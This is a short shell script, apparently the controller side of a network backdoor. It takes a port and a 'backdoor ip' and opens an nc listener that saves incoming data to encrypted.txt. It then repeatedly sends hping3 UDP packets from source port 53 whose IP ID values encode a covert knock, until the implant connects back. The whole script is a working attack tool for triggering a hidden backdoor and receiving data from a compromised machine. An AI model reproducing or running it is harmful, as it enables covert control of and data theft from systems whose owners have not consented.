#!/bin/sh


if [ $# -lt 2 ]
	then
		echo ". client.sh [listen port] [backdoor ip]"
		exit
fi

PORT=$1
IP=$2
TRY=1

n=$RANDOM
A=$(((RANDOM%899+100)*100+82))
B=$(((RANDOM%899+100)*100+71))
C=$(((RANDOM%899+100)*100+66))


nc -l -p $PORT > encrypted.txt &

while [ "$(netstat -tn | grep $PORT | wc -l)" -lt 1 ]
do
	hping3 -2 -c $TRY -N $(((RANDOM%899+100)*100+82)) -d 111 -s 53 -p $PORT $IP
	hping3 -2 -c $TRY -N $(((RANDOM%899+100)*100+71)) -d 111 -s 53 -p $PORT $IP
	hping3 -2 -c $TRY -N $(((RANDOM%899+100)*100+66)) -d 111 -s 53 -p $PORT $IP

	sleep 1
done
echo "connected"
fg
